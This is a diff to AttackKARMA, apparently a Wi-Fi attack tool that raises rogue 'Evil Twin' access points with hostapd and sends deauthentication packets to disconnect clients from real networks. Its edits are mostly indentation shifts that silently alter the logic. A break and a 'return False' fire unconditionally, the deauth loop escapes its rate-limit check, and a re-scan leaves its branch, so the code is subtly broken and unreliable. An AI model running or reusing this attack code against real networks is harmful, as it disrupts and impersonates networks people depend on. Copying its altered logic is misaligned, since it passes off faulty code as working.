@@ -356,7 +356,7 @@ class AttackKARMA(Attack):
                         if base['name'] == base_name:
                             rogue_interface = base['name']
                             Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (base interface for monitor probe {G}%s{W}){W}' % (rogue_interface, probe_interface))
-                            break
+                        break
                 else:
                     # Use same base interface as probe
                     rogue_interface = probe_interface
@@ -948,8 +948,8 @@ class AttackKARMA(Attack):
             else:
                 Color.pl('{!} {R}✗ Could not get interface status for {G}%s{W}' % interface)
                 Color.pl('{!} {O}Debug: iwconfig stderr: {O}%s{W}' % result.stderr.strip())
-                return False
-                
+            return False
+            
         except Exception as e:
             Color.pl('{!} {R}Error in verify_interface_mode: {O}%s{W}' % str(e))
             return False
@@ -1631,7 +1631,7 @@ class AttackKARMA(Attack):
         except Exception as e:
             if Configuration.verbose > 1:
                 Color.pl('{!} {R}Error in continuous deauth worker: {O}%s{W}' % str(e))
-
+    
     def adaptive_deauth_network_clients(self, network):
         """Send adaptive deauth packets with balanced approach - give clients time to connect"""
         try:
@@ -1667,29 +1667,29 @@ class AttackKARMA(Attack):
                 # Only send deauth packets at intervals to give clients time to connect
                 if current_time - last_deauth_time >= deauth_interval:
                     last_deauth_time = current_time
-                    
-                    # Send deauth packets based on current intensity
-                    intensity = self.deauth_intensity[network.bssid]
-                    packets_per_round = min(intensity * 2, 10)  # Reduced max packets per round
-                    
-                    for client in network.clients:
-                        try:
-                            # Send fewer deauth packets to avoid overwhelming
-                            for i in range(packets_per_round):
-                                self.send_adaptive_deauth(network, client, intensity)
-                                deauth_count += 1
-                                
-                                # Longer delay between packets
-                                time.sleep(0.2)
+                
+                # Send deauth packets based on current intensity
+                intensity = self.deauth_intensity[network.bssid]
+                packets_per_round = min(intensity * 2, 10)  # Reduced max packets per round
+                
+                for client in network.clients:
+                    try:
+                        # Send fewer deauth packets to avoid overwhelming
+                        for i in range(packets_per_round):
+                            self.send_adaptive_deauth(network, client, intensity)
+                            deauth_count += 1
+                            
+                            # Longer delay between packets
+                            time.sleep(0.2)
                             
                             # Log deauth activity every 10 packets (reduced frequency)
                             if deauth_count % 10 == 0:
                                 Color.pl('{+} {C}Deauth sent to {G}%s{W} - waiting {G}%d{W}s for connections' % 
                                         (network.essid, deauth_interval))
-                            
-                        except Exception as e:
-                            if Configuration.verbose > 1:
-                                Color.pl('{!} {R}Deauth failed for {G}%s{W}: {O}%s{W}' % 
+                        
+                    except Exception as e:
+                        if Configuration.verbose > 1:
+                            Color.pl('{!} {R}Deauth failed for {G}%s{W}: {O}%s{W}' % 
                                         (client.station, str(e)))
                 
                 # Longer sleep to give clients time to connect
@@ -1748,9 +1748,9 @@ class AttackKARMA(Attack):
                 else:
                     # Only scan if we haven't scanned yet
                     Color.pl('{+} {C}No previous scan found - scanning for networks...{W}')
-                    if not self.identify_real_networks():
-                        Color.pl('{!} {R}Still no real networks found in fallback mode{W}')
-                        return False
+            if not self.identify_real_networks():
+                Color.pl('{!} {R}Still no real networks found in fallback mode{W}')
+                return False
             
             # Mark as fallback mode
             self.fallback_mode = True
@@ -3642,12 +3642,12 @@ server=8.8.8.8
             if not self.hostapd_config:
                 Color.pl('{!} {R}No hostapd configuration found - cannot start Evil Twin{W}')
                 return False
-            
+                
             # Verify rogue AP config matches real network
             if not self.verify_rogue_ap_config():
                 Color.pl('{!} {R}Rogue AP config verification failed{W}')
                 return False
-            
+                
             # Start hostapd
             hostapd_cmd = ['hostapd', '-B', self.hostapd_config]
             Color.pl('{+} {C}Starting hostapd with config: {G}%s{W}' % self.hostapd_config)
@@ -4653,7 +4653,7 @@ server=8.8.8.8
                     Color.pl('{+} {G}All interfaces are unblocked{W}')
             except:
                 pass
-            
+                
             # Check NetworkManager status
             try:
                 result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], capture_output=True, text=True)
@@ -4663,7 +4663,7 @@ server=8.8.8.8
                     Color.pl('{!} {O}NetworkManager is not active{W}')
             except:
                 pass
-            
+                
             # Check interface status
             try:
                 result = subprocess.run(['iwconfig'], capture_output=True, text=True)
